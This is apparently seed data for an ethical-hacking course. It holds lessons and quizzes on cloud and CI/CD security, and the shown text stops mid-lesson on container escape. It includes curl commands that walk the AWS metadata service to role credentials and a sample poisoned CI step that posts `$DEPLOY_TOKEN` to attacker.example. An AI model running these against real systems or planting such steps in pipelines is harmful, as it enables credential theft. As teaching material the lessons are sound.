import type { ExerciseSeed, ModuleSeed } from './types';
import { videoSlot } from './types';

export const MODULES: ModuleSeed[] = [
  {
    slug: 'cloud',
    title: 'Cloud',
    description:
      "Someone else's data centre, rented by the hour - and where the mistakes hide once you move in. By the end you can name the core building blocks, read a bucket policy well enough to spot a public one, explain how an over-permissioned IAM role turns one leaked key into full account takeover, and describe how an SSRF bug reaches the metadata service and walks out with credentials.",
    lessons: [
      {
        slug: 'cloud-basics-for-hackers',
        title: 'Cloud Basics for Hackers',
        summary: "The cloud is just someone else's computer, rented by the hour. Here is the map, and where the mistakes hide.",
        estimatedMinutes: 8,
        importance: 'core',
        blocks: [
          {
            type: 'paragraph',
            text:
              "The cloud is not magic and it is not a fog somewhere in the sky. It is a company's data centre full of real servers, and you rent a slice of it by the hour with a credit card. Instead of buying a machine and racking it, you click a button and a server appears in about a minute. The big three providers are AWS, Azure and GCP, and they all sell the same core idea.",
          },
          {
            type: 'image',
            src: '/api/v1/diagrams/cloud-shared-responsibility',
            alt: 'Customer responsibilities beside provider responsibilities',
            caption: 'The provider secures the building. You still secure your own flat.',
          },
          {
            type: 'paragraph',
            text:
              "The diagram above is the single most important idea in cloud security: the shared responsibility model. Think of renting a flat instead of building a house. The landlord - the cloud provider - secures the building, the foundations, the physical locks on the front gate. What you leave unlocked inside your own flat is entirely on you. The provider promises the hardware, the network and the physical data centre are safe. Everything you put in it, and every setting you choose, is your problem. Almost every cloud breach you will ever read about is an unlocked flat, not a broken building.",
          },
          {
            type: 'paragraph',
            text:
              "Walk one concrete stack so the words stop being abstract. Say a small company runs a photo-sharing app. They rent a virtual server (compute) to run the code. They keep every uploaded photo in a storage bucket (storage). A permission system (IAM) decides that the web server is allowed to read the photo bucket but not delete the billing records. The server, when it needs to know about itself, quietly asks an internal metadata address for temporary credentials. And the database behind it all is a managed service the company never patches, because the provider does that. Five pieces, and each one is a place a setting can go wrong.",
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**Compute** - the rented servers (EC2 instances, VMs) that run your code',
              '**Storage** - the file dumps (S3 buckets, Azure Blobs, GCP buckets) holding backups, invoices and uploads',
              '**IAM** - the permission system that says who is allowed to do what',
              '**Metadata service** - a special internal-only URL every cloud box can hit to learn about itself and get credentials',
              '**Managed services** - databases, queues and functions you rent fully assembled and never patch yourself',
            ],
          },
          {
            type: 'command',
            description: 'On an account you own and are authorised to inspect, ask who your current credentials belong to and list the buckets they can see:',
            commands: ['aws sts get-caller-identity', 'aws s3 ls'],
          },
          {
            type: 'paragraph',
            text:
              "The first command answers a question you must always ask before touching anything: who am I here? It prints an `Account`, a `UserId` and an `Arn` - the full name of the identity your key represents. The second lists the storage buckets that identity is allowed to see. If `aws s3 ls` returns a long list on a key that was only supposed to read one bucket, you have just learned the credentials are over-scoped - and that is a finding before you have run a single attack. Reading who you are and what you can reach is step one of every cloud assessment.",
          },
          {
            type: 'paragraph',
            text:
              "Why this matters to a hacker or a defender: the shared responsibility line tells you where to look. You will not find a bug in Amazon's physical racks - that is the provider's side and it is genuinely well guarded. You will find the public bucket, the key committed to a public repo, the role that can do everything. Those are all on the customer's side of the line. When you report a cloud issue, you frame it exactly that way: the provider is fine, this specific customer setting is what exposes the data.",
          },
          {
            type: 'callout',
            variant: 'info',
            title: 'Shared responsibility, in one line',
            text:
              "The provider secures the cloud. You secure what you put *in* it. That single sentence explains why almost every cloud finding is a customer mistake, not a provider bug - and it is where you always start looking.",
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'You just unlocked',
            text: "You can name the main cloud building blocks and, more importantly, say which side of the responsibility line each mistake sits on.",
          },
          {
            type: 'quiz',
            question: 'Under the shared responsibility model, who secures the data you upload to a storage bucket?',
            options: ['The cloud provider', 'You, the customer', 'Nobody, it is automatic', 'The government'],
            correctIndex: 1,
            explanation: 'The provider secures the infrastructure. Configuring and locking down your own data is your job - which is exactly why open buckets are so common.',
          },
        ],
      },
      {
        slug: 's3-and-storage-misconfigs',
        title: 'Storage Buckets Left Open',
        summary: 'A storage bucket set to public is a filing cabinet left on the pavement. People find them, and downloading is not the worst part.',
        estimatedMinutes: 9,
        importance: 'core',
        blocks: [
          videoSlot('Open S3 buckets - how a single wrong setting leaks a whole company'),
          {
            type: 'paragraph',
            text:
              "Cloud storage buckets - AWS S3, Azure Blobs, GCP Storage - are giant online folders that hold files: database backups, customer invoices, profile pictures, log dumps. By default a new bucket is private, readable only by the account that owns it. But security lives in the settings, and a single wrong toggle turns that private folder into something the entire internet can read.",
          },
          {
            type: 'paragraph',
            text:
              "Here is how it actually goes wrong. A developer wants to serve images from a bucket, finds the images are blocked, and flips the bucket to public read to make the error go away. That toggle does not distinguish between the harmless product images and the `db-backup-2023.sql` sitting in the next folder. Now both are world-readable. People find these buckets constantly - through predictable names like `companyname-backups`, through links that leaked in an old web page, or through plain guessing at common patterns.",
          },
          {
            type: 'paragraph',
            text:
              "There are two separate permissions in play, and mixing them up is the classic mistake. *Listing* is permission to see the index - to get the names of every file in the bucket. *Object read* is permission to download a specific file if you know its exact name. A careful attacker checks both, because a bucket can block the index while leaving every file inside individually readable, so knowing the filename is all you need.",
          },
          {
            type: 'command',
            description: 'On a bucket you own or are explicitly authorised to test, try to list it without any credentials, then try fetching it over plain HTTP:',
            commands: [
              'aws s3 ls s3://example-bucket --no-sign-request',
              'curl -s https://example-bucket.s3.amazonaws.com/',
            ],
          },
          {
            type: 'paragraph',
            text:
              "The `--no-sign-request` flag is the whole point of the first command - it tells the AWS tool to send no credentials at all, so you are testing exactly what an anonymous stranger sees. If it prints a list of files, the bucket allows public listing and you have your index. The `curl` line does the same thing over raw HTTP: a public bucket returns an XML document listing its contents, while a locked one returns an `AccessDenied` error. Reading that response is the test - a file list means open, an access-denied means the anonymous door is shut.",
          },
          {
            type: 'paragraph',
            text:
              "Impact, and what you would report: a readable bucket is a straight data-exposure finding, and the severity is whatever the files are - customer records and backups are critical, public marketing images are noise. But do not stop at read. If the bucket also allows anonymous *write*, that is worse: an attacker can upload or overwrite a file that other people or systems trust, which turns a data leak into a foothold. In a report you state the bucket name, whether listing and read and write are each open, and a sample of the sensitive file types you found - never the full dump.",
          },
          {
            type: 'callout',
            variant: 'warning',
            title: 'Listable is not the only risk',
            text:
              "Even a bucket you cannot *list* may hand you a file if you guess its name, because object read is a separate permission from listing. And write access is the quiet killer - an attacker who can upload can plant a file others will trust.",
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Stay legal',
            text: 'Only access buckets on targets you own or are explicitly authorised to test. Guessing your way into someone else\'s data is not research, it is an offence.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'You just unlocked',
            text: 'You know why open buckets happen, how people find them, and the difference between listing, reading and writing exposure.',
          },
          {
            type: 'quiz',
            question: 'A bucket blocks listing but you can still download `secret.pdf` if you know the exact name. What does this mean?',
            options: [
              'The bucket is fully secure',
              'Object-level read is still open even though listing is off',
              'You need admin credentials',
              'The file does not really exist',
            ],
            correctIndex: 1,
            explanation: 'Listing and per-object read are separate permissions. Blocking the index does not help if the objects themselves are still world-readable.',
          },
        ],
      },
      {
        slug: 'iam-and-privilege-issues',
        title: 'IAM and Privilege Issues',
        summary: 'IAM decides who can do what in the cloud. Get it too generous and one leaked key quietly owns everything.',
        estimatedMinutes: 9,
        importance: 'core',
        blocks: [
          {
            type: 'paragraph',
            text:
              "IAM - Identity and Access Management - is the cloud's permission system, and it is where cloud security is really won or lost. Every user, every service and every machine gets an identity, and each identity carries a policy: a list of exactly what it is allowed to touch. Done well, a leaked key can only do the one small thing that identity was ever meant to do. Done badly, a leaked key does everything.",
          },
          {
            type: 'image',
            src: '/api/v1/diagrams/iam-privilege-chain',
            alt: 'A read-only key escalating step by step to full admin',
            caption: 'Every single link looks minor. Following the chain to the end is critical.',
          },
          {
            type: 'paragraph',
            text:
              "The chain in the diagram is the thing to understand. Permissions are written as rules like `Allow s3:GetObject on bucket-x` - a verb, a service, a resource. The safe way is *least privilege*: give an identity exactly the verbs it needs and nothing else. The dangerous shortcut is the wildcard `*`, which means everything. People reach for `*` because working out the precise permissions is fiddly and `Allow *:* on *` makes the error stop. Now the key that was only supposed to read one bucket can also delete servers, read the billing account, and create new users.",
          },
          {
            type: 'paragraph',
            text:
              "Walk a real escalation so the danger is concrete. An attacker finds a leaked key with what looks like a boring permission: `iam:AttachUserPolicy` - it can attach a policy to a user. On its own that sounds administrative and dull. But the attacker uses it to attach the built-in `AdministratorAccess` policy to the very identity the key belongs to. One API call later, the read-only key is now an admin key. That is privilege escalation: a small permission used to grant yourself a bigger one, until you own the account. The starting door was tiny; the room behind it was the whole house.",
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**Least privilege** - give exactly the access needed, nothing more; the whole discipline in one phrase',
              '**Over-permissioned roles** - the `AdministratorAccess`-on-everything trap that makes any leak catastrophic',
              '**Privilege escalation** - a weak permission (like editing a policy) used to grant yourself a stronger one',
              '**Leaked keys** - long-lived credentials hardcoded in code, committed to a repo, or left in a config file',
            ],
          },
          {
            type: 'command',
            description: 'On an account you are authorised to assess, confirm who a set of credentials is and enumerate what one user is allowed to do:',
            commands: ['aws sts get-caller-identity', 'aws iam list-attached-user-policies --user-name someuser'],
          },
          {
            type: 'paragraph',
            text:
              "The first command tells you the identity the key represents - always your starting point. The second lists the managed policies attached to a user, and the output is a list of policy names like `AmazonS3ReadOnlyAccess` or, alarmingly, `AdministratorAccess`. Reading that list is how you judge blast radius before you touch anything: a user with `AdministratorAccess` means the key you are holding can do everything, and a user with only a narrow read policy means a leak there is far less serious. The policy names are the map of what one leaked key would actually cost.",
          },
          {
            type: 'paragraph',
            text:
              "Impact and reporting: an over-permissioned identity is not itself a breach, but it is the multiplier that turns any other bug into a full compromise. In a report you name the identity, list its excessive permissions, and spell out the escalation path in plain steps - 'this key can edit its own policy, therefore it can make itself admin' - because a defender needs to see the chain, not just the word 'over-permissioned'. The fix you recommend is always the same direction: strip it back to least privilege.",
          },
          {
            type: 'callout',
            variant: 'warning',
            title: 'The real danger is chaining',
            text:
              "A tiny permission like 'can update a role's policy' is enough. You use it to attach admin rights to your own identity, and now you own the account. Small door, enormous room behind it.",
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'You just unlocked',
            text: 'You understand least privilege, can read a policy list to judge blast radius, and can explain how one weak permission chains up to full account takeover.',
          },
          {
            type: 'quiz',
            question: 'Why is an identity with permission to "modify IAM policies" so dangerous?',
            options: [
              'It lets you read logs',
              'It can be used to grant itself full admin rights',
              'It slows the system down',
              'It only affects billing',
            ],
            correctIndex: 1,
            explanation: 'If you can edit permissions, you can give yourself more permissions - the classic privilege escalation path straight to full control.',
          },
        ],
      },
      {
        slug: 'metadata-service-ssrf',
        title: 'SSRF to Cloud Metadata',
        summary: 'Every cloud box has a secret internal URL that hands out credentials. SSRF is how an attacker reaches it through your app.',
        estimatedMinutes: 10,
        importance: 'core',
        blocks: [
          videoSlot('SSRF to cloud metadata - stealing cloud credentials through one vulnerable request'),
          {
            type: 'paragraph',
            text:
              "This is one of the most famous cloud attacks, and it is beautiful in how it turns a small bug into a total takeover. Every cloud server can ask a special internal address for information about itself, including short-lived credentials for the role attached to it. On AWS that address is `169.254.169.254`. It is only reachable from inside the box, which is exactly why teams treat it as trusted and safe.",
          },
          {
            type: 'image',
            src: '/api/v1/diagrams/metadata-ssrf',
            alt: 'An app tricked into fetching the cloud metadata address and returning credentials',
            caption: 'The server can reach the metadata address and you cannot - so you make the server fetch it for you.',
          },
          {
            type: 'paragraph',
            text:
              "It stops being safe the moment the app has an SSRF bug. SSRF - Server-Side Request Forgery - is any feature where you hand the app a URL and the *server* goes and fetches it. A 'preview this link' box, an avatar-from-URL uploader, a webhook tester. Normally you point it at a website. Instead you point it at `http://169.254.169.254/latest/meta-data/`. The server, sitting inside the trusted zone, dutifully fetches its own metadata and returns the result to you - including, if you walk the right path, the temporary keys for its role.",
          },
          {
            type: 'paragraph',
            text:
              "Walk the exact path. First you request `http://169.254.169.254/latest/meta-data/` and the server returns a directory listing of what is available. You spot `iam/security-credentials/` and request that, which returns the name of the role, say `web-app-role`. You then request `http://169.254.169.254/latest/meta-data/iam/security-credentials/web-app-role` and the metadata service hands back a JSON blob with an `AccessKeyId`, a `SecretAccessKey` and a `Token`. Those three values are working credentials for the server's role - and now you can act as that server from your own laptop.",
          },
          {
            type: 'command',
            description: 'The requests the vulnerable server ends up making on your behalf (run only against systems you are authorised to test):',
            commands: [
              'curl -s http://169.254.169.254/latest/meta-data/',
              'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/',
              'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/web-app-role',
            ],
          },
          {
            type: 'paragraph',
            text:
              "Read the output as a ladder. The first request returns a plain list of category names - `iam/`, `instance-id`, `hostname` and so on - telling you what the box will talk about. The second returns the role name attached to the instance, which you plug into the third request. The third returns the credential JSON. Each response feeds the next request, which is why the attack is a walk down a directory tree rather than one magic URL. The instant the third response contains an `AccessKeyId`, you are holding live cloud credentials.",
          },
          {
            type: 'paragraph',
            text:
              "Impact and reporting: this is usually a critical finding, because the stolen role often has enough IAM permissions to read data, spin up resources, or move deeper into the account. In a report you show the exact vulnerable parameter (the URL field that fetched the metadata), the response proving credentials came back - redacted - and you connect it to the previous lesson: the damage is bounded entirely by how over-permissioned that role is. A least-privilege role limits the blast; an admin role means game over.",
          },
          {
            type: 'callout',
            variant: 'info',
            title: 'IMDSv2 is the fix',
            text:
              "Newer AWS metadata (IMDSv2) requires the client to fetch a token with a `PUT` first and send it on every read, which most simple SSRF payloads cannot do. If a target still answers the plain v1 `GET` above, that alone is worth flagging.",
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Stay legal',
            text: 'Only chase metadata credentials on systems you own or are authorised to test. Fetching credentials you were not given is unauthorised access.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'Level up',
            text: 'You can explain how an SSRF bug reaches the metadata service, walk the directory path to the credential JSON, and say why IMDSv2 and least privilege each blunt the attack.',
          },
          {
            type: 'quiz',
            question: 'Why does SSRF turn the cloud metadata service into a credential leak?',
            options: [
              'The metadata address is public to everyone',
              'SSRF makes the server itself request the internal metadata URL and return the result',
              'Metadata is stored in the database',
              'It brute-forces the password',
            ],
            correctIndex: 1,
            explanation: 'The metadata endpoint only trusts requests coming from the box. SSRF makes the box send the request, so its credentials come back to the attacker.',
          },
        ],
      },
      {
        slug: 'serverless-security',
        title: 'Serverless Security',
        summary: 'No server to patch does not mean no attack surface. The bugs do not vanish, they just move into the function.',
        estimatedMinutes: 8,
        importance: 'optional',
        blocks: [
          {
            type: 'paragraph',
            text:
              "Serverless - AWS Lambda, Google Cloud Functions, Azure Functions - runs your code only when something triggers it, and you never manage a server at all. An HTTP request, a file landing in a bucket, a message on a queue: the trigger fires, your function spins up, runs for a few seconds, and disappears. You pay only for those seconds. It is genuinely great for cost and scale. But 'no server' is a claim about operations, not about security, and the bugs simply relocate.",
          },
          {
            type: 'paragraph',
            text:
              "Here is where they land, and why. Each function is a tiny app in its own right: it takes input, it holds permissions, and it trusts its dependencies - so every web weakness you already know still applies, just scoped to one function. The catch that trips teams up is scale. A company might run three servers but three hundred functions, and nobody is going to hand-tune three hundred IAM roles, so the wildcard `*` creeps back in per function. Multiply the over-permissioned-role problem by three hundred and you have a lot of small doors.",
          },
          {
            type: 'paragraph',
            text:
              "Walk one concrete failure. A function is triggered by a file upload and reads the file's name from the event to log it. The attacker uploads a file whose name is crafted to be a command or an injection string. Because the function passes that untrusted event field straight into a shell call or a database query, the attacker's input runs inside the function - and the function is holding a role that can, say, read a secrets bucket. The 'event' from the trigger was untrusted data all along, exactly like a request body, and it got trusted anyway.",
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**Over-permissioned functions** - the same IAM `*` trap, now repeated across dozens or hundreds of functions',
              '**Event injection** - untrusted data inside the triggering event, treated as safe because it did not arrive as an obvious request',
              '**Leaked env vars** - secrets stashed in a function\'s environment variables, readable by anyone who can view its config',
              '**Dependency risk** - one poisoned package pulled into a function nobody audits, running with the function\'s permissions',
            ],
          },
          {
            type: 'command',
            description: 'On an account you own, list a function\'s configuration and read the environment variables it carries:',
            commands: ['aws lambda list-functions', 'aws lambda get-function-configuration --function-name my-func'],
          },
          {
            type: 'paragraph',
            text:
              "The first command enumerates the functions in the account. The second dumps one function's configuration, and the field to read is `Environment.Variables` - a plain key-value map. If you see something like `DB_PASSWORD` or `API_TOKEN` sitting there in clear text, the function is storing a secret where anyone with permission to view its config can lift it. That output is the evidence: a secret in an environment variable is a leaked secret the moment the config is readable, no exploit required.",
          },
          {
            type: 'paragraph',
            text:
              "Impact and reporting: test a function like any endpoint - feed the trigger hostile input and watch what breaks - but always remember it may be holding its own cloud credentials, so a bug inside a function can pivot into the wider account. In a report you name the function, the specific weakness (over-broad role, injectable event field, plaintext secret), and what that function's role can reach, because that reach is the real severity.",
          },
          {
            type: 'callout',
            variant: 'warning',
            title: 'Each function is a tiny app',
            text:
              "It still takes input, still has permissions, still trusts its dependencies. Test it exactly like an endpoint - and remember it may carry its own credentials, so one bug reaches further than the function itself.",
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'You just unlocked',
            text: "You know serverless removes the server, not the risk, and can name where a function's real weak points sit and why scale makes them worse.",
          },
          {
            type: 'quiz',
            question: 'What is a common serverless-specific weakness?',
            options: [
              'The physical server rack',
              'Over-permissioned function roles and secrets left in environment variables',
              'The keyboard layout',
              'The monitor resolution',
            ],
            correctIndex: 1,
            explanation: 'Functions still get IAM roles and env vars. Too many permissions or a plaintext secret makes a single function a way in.',
          },
        ],
      },
    ],
  },
  {
    slug: 'containers-and-cicd',
    title: 'Containers and CI/CD',
    description:
      'The build pipeline and the containers it ships are attack surface, not a black box. By the end you can pull a secret out of an old image layer, explain why a poisoned pull request lets you inherit a pipeline\'s deploy keys, name three ways a bad dependency gets into an app, and describe the misconfigurations - a privileged flag, an exposed Docker socket - that let a container break out onto its host.',
    lessons: [
      {
        slug: 'docker-basics-for-hackers',
        title: 'Docker Basics for Hackers',
        summary: 'A container is an app packed with everything it needs, in a box. Here is what a hacker digs for in that box.',
        estimatedMinutes: 8,
        importance: 'core',
        blocks: [
          videoSlot('Docker in 6 minutes for hackers - images, containers and what leaks'),
          {
            type: 'paragraph',
            text:
              "A container packs an application plus everything it needs to run - libraries, config, a slice of operating system - into one portable box that behaves the same on a laptop, a server or the cloud. Docker is the most common tool for building and running these. The two words you must not mix up: an *image* is the frozen box, saved to disk; a *container* is a running copy of that image, live and doing work.",
          },
          {
            type: 'paragraph',
            text:
              "A tiffin box is the honest analogy: the meal and its little compartments travel together, sealed, ready to eat anywhere. For a hacker, the interesting question is what got packed by accident. Because building an image is a fast, automated process, things end up baked in that were never meant to ship - a secret key used during the build, a chunk of source code, an old and vulnerable version of some library. The box preserves all of it.",
          },
          {
            type: 'paragraph',
            text:
              "The mechanism that makes this a security topic is *layers*. An image is not one flat blob - it is built up as a stack of layers, one per build step, and every layer is kept. Picture a Dockerfile that on line 5 copies in a secret file, uses it, and on line 9 deletes it. The delete on line 9 creates a new top layer where the file is gone. But the layer created at line 5 still contains the file, sitting underneath, untouched. The running container looks clean; the image history remembers everything.",
          },
          {
            type: 'command',
            description: 'On a machine you control, list running containers, then the images on disk, then the build history of one image:',
            commands: ['docker ps', 'docker images', 'docker history --no-trunc some-image'],
          },
          {
            type: 'paragraph',
            text:
              "`docker ps` shows what is running right now - one row per live container, with its name and the image it came from. `docker images` lists the frozen images available locally. The revealing one is `docker history --no-trunc some-image`: it prints every layer in order, and against each layer the exact build command that created it. Reading that output is how you spot the mistake - a line like `COPY secret.env .` or a `RUN` command with a password typed into it tells you a secret was added at that step, and thanks to layering it is still recoverable even if a later step 'removed' it.",
          },
          {
            type: 'paragraph',
            text:
              "Impact and reporting: a leaked secret in an image layer is a real credential leak, and the severity is whatever that credential unlocks. When you find one you report the image name and tag, the specific layer command that introduced the secret, and the fact that deleting it in a later step does not remediate it - the fix is to rebuild without ever adding it, or to rotate the credential. This is also why public image registries are worth a look: people push images not realising their build secrets came along for the ride.",
          },
          {
            type: 'callout',
            variant: 'info',
            title: 'Images leak history',
            text:
              "Every layer of an image is kept forever. A secret that was added and then 'deleted' in a later step is almost always still sitting in the earlier layer, waiting for `docker history` to surface it.",
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'You just unlocked',
            text: 'You can tell an image from a container, read an image\'s layer history, and know that layers quietly remember every secret they were ever handed.',
          },
          {
            type: 'quiz',
            question: 'Why can a secret "removed" from a Docker image still be recoverable?',
            options: [
              'Docker encrypts nothing',
              'Each build step is a saved layer, so the secret survives in the layer that added it',
              'Containers never delete files',
              'The secret is emailed to you',
            ],
            correctIndex: 1,
            explanation: 'Images are built in layers and every layer is retained. Deleting a file in a later layer does not erase it from the one that added it.',
          },
        ],
      },
      {
        slug: 'cicd-pipeline-attacks',
        title: 'CI/CD Pipeline Attacks',
        summary: 'The pipeline that builds and ships code runs with powerful keys. Compromise it and it ships your exploit for you.',
        estimatedMinutes: 9,
        importance: 'core',
        blocks: [
          {
            type: 'paragraph',
            text:
              "CI/CD is the automated assembly line behind modern software. CI (continuous integration) means every time someone pushes code, a machine automatically builds it and runs the tests. CD (continuous delivery/deployment) means if the tests pass, that machine automatically deploys the result to production. The whole point is speed: a developer pushes, and minutes later the change is live, no human touching the deploy button.",
          },
          {
            type: 'paragraph',
            text:
              "That automation is powered by strong credentials, and that is what makes the pipeline a prize. To deploy, the pipeline must hold deploy keys. To ship to the cloud, it holds cloud access. To publish signed releases, it holds signing secrets. So the build machine is often one of the most privileged things in the whole company - and unlike a production server, it happily runs whatever code the repository tells it to. If you can influence what the pipeline runs, you inherit all of that power.",
          },
          {
            type: 'paragraph',
            text:
              "Walk the classic path: the poisoned pull request. Many projects run their full CI pipeline automatically on every pull request, including ones from outside contributors. An attacker opens a pull request that changes a build or test script - not the app itself, the *build* step. When CI runs, it executes that modified script with the pipeline's credentials in the environment. The attacker's script reads those credentials and exfiltrates them, or simply uses them then and there to deploy a backdoored build. 'Run the tests' quietly became 'run my code as the pipeline'.",
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**Poisoned pull requests** - a PR that modifies a build step so CI runs attacker code with pipeline credentials',
              '**Leaked pipeline secrets** - tokens accidentally printed into build logs that are often widely readable',
              '**Insecure build scripts** - unpinned steps that fetch and run remote code, so whoever controls that remote controls the build',
              '**Over-trusted runners** - a build machine that also has standing access to production',
            ],
          },
          {
            type: 'code',
            language: 'yaml',
            filename: 'poisoned-step.yml',
            code:
              'jobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - name: Run tests\n        run: |\n          npm test\n          # attacker-added line in a pull request:\n          curl -s https://attacker.example/collect -d "token=$DEPLOY_TOKEN"',
          },
          {
            type: 'paragraph',
            text:
              "Read that snippet as a defender would. It looks like an ordinary test job until the last line. `$DEPLOY_TOKEN` is a pipeline secret injected into the environment for the deploy step; the added `curl` posts it to a server the attacker controls. The tell is any build step that sends data *out* to an unexpected address, or that references a secret in a step that has no business touching it. When you review a pipeline, you read every `run` block asking one question: does this step send a secret somewhere it should not, or execute code fetched from somewhere untrusted?",
          },
          {
            type: 'paragraph',
            text:
              "Impact and reporting: a pipeline compromise is typically critical, because it can mean shipping malicious code straight to production and stealing the credentials to everything the pipeline touches. In a report you point at the exact mechanism - 'CI runs on external pull requests and exposes `DEPLOY_TOKEN` to the build step' - and note the secondary problem that build logs are readable, so any leaked value is also historical. The fix direction: do not expose deploy secrets to untrusted PR builds, and pin every external build action to a fixed version.",
          },
          {
            type: 'callout',
            variant: 'warning',
            title: 'Logs are a goldmine',
            text:
              "Build logs are often public or widely readable, and pipelines love to echo variables while debugging. A secret printed into a log just once lives in that log forever.",
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'You just unlocked',
            text: 'You see why the build pipeline is part of the attack surface, can spot a poisoned build step, and know where its secrets tend to leak.',
          },
          {
            type: 'quiz',
            question: 'Why is a CI/CD pipeline such a high-value target?',
            options: [
              'It has no permissions at all',
              'It runs with powerful deploy and cloud credentials, so controlling it can push code to production',
              'It only runs on weekends',
              'It stores nothing useful',
            ],
            correctIndex: 1,
            explanation: 'Pipelines hold deploy keys and cloud access. Influencing what one runs can mean shipping your own code straight to production.',
          },
        ],
      },
      {
        slug: 'dependency-and-supply-chain-risks',
        title: 'Dependencies and Supply Chain',
        summary: "Your app is mostly other people's code. One bad package and you inherited their bug - or their backdoor.",
        estimatedMinutes: 9,
        importance: 'core',
        blocks: [
          {
            type: 'paragraph',
            text:
              "Modern software is assembled, not written from scratch. A typical app pulls in hundreds of third-party packages - and the code you personally wrote might be five percent of what actually ships. The other ninety-five percent came from package registries like `npm` for JavaScript and PyPI for Python, and almost nobody reads it. You type `npm install` and thousands of files you have never seen run inside your app with your app's permissions.",
          },
          {
            type: 'paragraph',
            text:
              "That trust is the attack surface, and it fails in three distinct ways. First, a package you depend on has a *known vulnerability* - you inherit a bug you did not write. Second, a legitimate package gets *hijacked*: an attacker takes over the maintainer account and pushes a malicious update, so your next routine upgrade quietly pulls in a backdoor. Third, *typosquatting*: an attacker publishes a package named one letter off from a popular one, betting on a mistyped install.",
          },
          {
            type: 'paragraph',
            text:
              "Walk the typosquatting case concretely, because it is the sneakiest. The real package is `requests`. An attacker publishes `reqeusts` - the 'u' and 'e' swapped. A developer, half-awake, runs `pip install reqeusts` or copies a broken command from somewhere, and the malicious package installs. Its setup script runs immediately, on the developer's own machine, with the developer's permissions - reading environment variables, keys, whatever it can reach. The app never even had to run; installing was enough. One transposed letter, and someone else's code executed on your box.",
          },
          {
            type: 'command',
            description: 'On a project you own, ask the package tools what is vulnerable or out of date:',
            commands: ['npm audit', 'pip list --outdated'],
          },
          {
            type: 'paragraph',
            text:
              "`npm audit` cross-checks your installed packages against a database of known vulnerabilities and prints a report grouped by severity, telling you which dependency is affected and often which version fixes it. Read the severity column first - a `high` or `critical` in a package your app actually uses at runtime is what matters, while a `low` in a build-only tool is usually noise. `pip list --outdated` is blunter: it just shows which Python packages have a newer release, which is a starting point for spotting a dependency that has been left to rot on a version with known holes.",
          },
          {
            type: 'paragraph',
            text:
              "Impact and reporting: supply-chain issues range from 'annoying, update it' to 'this dependency was backdoored and ran on every build machine'. When you report one you name the exact package and version, the specific vulnerability or malicious behaviour, and where it runs - a vulnerable package that only executes during tests is far less urgent than one in the production request path. The general defence you recommend: pin versions, review what you add, and audit regularly rather than trusting the registry blindly.",
          },
          {
            type: 'callout',
            variant: 'info',
            title: 'Typosquatting is real',
            text:
              "Attackers publish packages named one letter off from popular ones and wait. A single typo in an `install` command and you have handed your machine someone else's code, running as you.",
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'You just unlocked',
            text: 'You understand why dependencies are an attack surface, can name three ways a bad package gets in, and can read an audit report to judge which finding actually matters.',
          },
          {
            type: 'quiz',
            question: 'What is typosquatting in the context of packages?',
            options: [
              'Fixing typos in your code',
              'Publishing a malicious package with a name one letter off from a popular one',
              'A faster way to type commands',
              'A kind of firewall',
            ],
            correctIndex: 1,
            explanation: 'Attackers register near-identical names hoping a developer mistypes the real one and installs the malicious copy.',
          },
        ],
      },
      {
        slug: 'container-escape-concepts',
        title: 'Container Escape Concepts',
        summary: 'Containers feel like separate boxes. Sometimes they are thin walls you can climb over onto the host.',
        estimatedMinutes: 8,
        importance: 'optional',
        blocks: [
          {
            type: 'paragraph',
            text:
              "A container is supposed to be isolated - its own filesystem, its own processes, walled off from the host machine and from other containers. That isolation is usually good enough to treat as a boundary. But it is not a wall of stone. A container shares the host's *kernel* - the core of the operating system - rather than running a full separate one like a true virtual machine does. That shared kernel is the thin part of the wall, and a container escape is climbing over it to run on the host itself.",
          },
          {
            type: 'paragraph',
            text:
              "Escapes almost never come from breaking Docker's clever isolation directly. They come from misconfigurations that hand the container more power than it should have. The pattern is always the same: something gives the container a direct line to the host - a device, a filesystem path, a socket, or an over-broad set of privileges - and the attacker walks straight through it. Understanding the specific misconfigurations is the whole lesson, because those are what you look for.",
          },
          {
            type: 'paragraph',
            text:
              "Walk the most famous one: the exposed Docker socket. `/var/run/docker.sock` is the control channel Docker itself uses to create and manage containers. Sometimes a container is given access to this socket - often so it can manage other containers as part of some tooling. But anyone who can talk to the Docker socket can ask Docker to create a *new* container, run it with `--privileged`, and mount the host's entire filesystem (`/`) inside it. Now the attacker has a container that can read and write every file on the host, including the ways to run commands as root on the host. The escape is complete, and it used a legitimate feature.",
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**Privileged containers** - run with `--privileged`, which strips away most of the isolation and hands the container near-host power',
              '**Mounted host paths** - a container that can read or write the host\'s `/` filesystem straight through a bind mount',
              '**Exposed Docker socket** - `/var/run/docker.sock` reachable inside a container is effectively game over',
              '**Kernel exploits** - the shared kernel means a bug in the kernel can be attacked from inside the container to break out',
            ],
          },
          {
            type: 'command',
            description: 'From inside a container you own and are testing, check for the tell-tale signs of a weak boundary:',
            commands: ['ls -la /var/run/docker.sock', 'cat /proc/1/cgroup', 'mount | grep -i host'],
          },
          {
            type: 'paragraph',
            text:
              "Read each check. If `ls -la /var/run/docker.sock` shows the socket file exists and is readable, that is the exposed-socket condition - the strongest escape path. `cat /proc/1/cgroup` reveals whether you are in a container at all and hints at how it was started; certain patterns suggest a privileged or host-networked setup. `mount | grep -i host` looks for host directories mounted into the container - if the host's `/` or a sensitive path shows up, the container can already read the host directly. Any one of these turning up positive is the finding: the container has a line to the host it should not have.",
          },
          {
            type: 'paragraph',
            text:
